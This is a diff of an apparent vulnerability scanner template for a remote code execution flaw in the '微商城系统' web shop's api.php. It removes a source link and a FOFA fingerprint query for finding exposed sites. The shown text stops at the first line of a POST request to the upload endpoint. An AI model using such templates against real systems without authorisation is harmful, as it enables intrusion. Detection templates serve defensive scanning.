@@ -3,12 +3,8 @@ info:
   name: 微商城系统 api.php存在RCE漏洞
   author: hacktwo
   severity: high
-  description: '来源: 语雀漏洞知识库 https://www.yuque.com/hacktwo/dtdx2v/nyeoqhir04vc0s7c'
+  description: ''
   tags: rce,2024
-  metadata:
-    source: yuque-hacktwo-dtdx2v
-    doc-slug: nyeoqhir04vc0s7c
-    fofa: body="/Mao_Public/js/jquery-2.1.1.min.js"
 http:
 - raw:
   - 'POST /api/api.php?mod=upload&type=1 HTTP/1.1
